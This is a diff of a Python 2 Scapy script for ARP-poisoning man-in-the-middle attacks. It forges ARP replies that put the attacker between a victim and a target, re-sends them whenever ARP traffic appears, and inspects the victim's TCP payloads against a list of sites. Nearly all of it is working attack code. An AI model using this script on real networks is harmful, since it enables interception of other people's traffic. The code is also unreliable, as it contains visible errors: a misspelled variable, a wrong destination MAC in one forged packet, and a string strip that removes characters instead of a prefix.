@@ -48,46 +48,38 @@ print "——————————————————————"
 Target_mac_addr = Target_mac_addr[0][0][1].src
 Victim_mac_addr= Victim_mac_addr[0][0][1].src
 
-# Forge the ARP packet for the victim
-arpFakeVic = ARP()
-arpFakeVic.op=2
-arpFakeVic.psrc=Target_IP_addr
-arpFakeVic.pdst=Victim_IP_addr
-arpFakeVic.hwdst=Victim_mac_addr
+# First Arp Poison #
+send(ARP(op=2, pdst =Victim_IP_addr,psrc=Target_IP_addr, hwdst =Victim_mac_addr, hwsrc=Attacker_Mac_addr))
+send(ARP(op=2, pdst =Target_IP_addr,psrc=Victim_IP_addr, hwdst =Victim_mac_addr, hwsrc=Attacker_Mac_addr))
 
-# Forge the ARP packet for the default GW
-arpFakeDGW = ARP()
-arpFakeDGW.op=2
-arpFakeDGW.psrc=Victim_IP_addr
-arpFakeDGW.pdst=Target_IP_addr
-arpFakeDGW.hwdst=Target_mac_addr
-
-send(arpFakeVic)
-send(arpFakeDGW)
-
+# ** Add mul_list **#
+# if http://www.naver.com -> naver.com #
+###################################################
 f = open("/root/Desktop/last/mal_site.txt","r")
+
 mul_sitelist = []
-for line in f:
-	if line.find('\n'):
-		line = line.strip('\n')
-	if line.find('http://')>-1:
-		line = line.strip('http://')
-	line = line.split('\n')[0]
-	mul_sitelist.append(line)	
+
+for url in f:
+	url = url.strip('\n')
+	if url.find('http://')>-1:
+		url = url.strip('http://')
+	url = url.split('\n')[0]
+	mul_sitelist.append(url)	
 print mul_sitelist
 
-
+###################################################
 def arp_monitor_callback(pkt):
         #if pkt.haslayer(TCP) and pkt.haslayer(Raw):
 		#pkt[TCP].show()
 			#print pkt[TCP].paylaod
 	if ARP in pet:
-                        send(arpFakeVic)
-                        send(arpFakeDGW)
-                        print "ARP Poison"
+			send(ARP(op=2, pdst =Victim_IP_addr,psrc=Target_IP_addr, hwdst =Victim_mac_addr, hwsrc=Attacker_Mac_addr))
+			send(ARP(op=2, pdst =Target_IP_addr,psrc=Victim_IP_addr, hwdst =Victim_mac_addr, hwsrc=Attacker_Mac_addr))
+                        print "Arp "
         else:
                 if pkt[IP].src==Victim_IP_addr:
-        		if pkt.haslayer(TCP) and pkt.haslayer(Raw):
+        		#Send Packet Capture mul_site#
+			if pkt.haslayer(TCP) and pkt.haslayer(Raw):
 				for i in mul_sitelist:
 					print i.encode("hex")
 					pay = pkt[Raw].load
